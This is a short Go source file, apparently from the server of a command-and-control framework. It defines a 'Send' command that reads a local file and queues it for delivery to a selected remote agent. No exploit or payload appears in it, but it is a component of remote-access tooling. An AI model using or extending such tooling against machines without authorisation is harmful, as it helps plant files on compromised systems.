package commands

import (
	"d3c/server/helpers"
	"global"
	"log"
	"os"
)

type Send struct {
	Command []string
}

func (instance Send) Exec() (response string, err error) {
	if len(instance.Command) > 1 && helpers.SelectedAgent != "" {
		file := &global.File{}
		file.Name = instance.Command[1]

		var fileErr error
		file.Content, fileErr = os.ReadFile(file.Name)

		commandSend := &global.Command{}
		commandSend.Request = instance.Command[0]
		commandSend.File = *file
		if fileErr != nil {
			response = "Open file error: " + fileErr.Error()
			log.Println("Open file error: ", fileErr.Error())
		} else {
			helpers.AddCommandToAgent(*commandSend, helpers.SelectedAgent)
			response = "File sent to agent: " + instance.Command[1]
		}
	} else {
		response = "Specify the file to be uploaded!"
		log.Println("Specify the file to be uploaded!")
	}

	return response, err
}
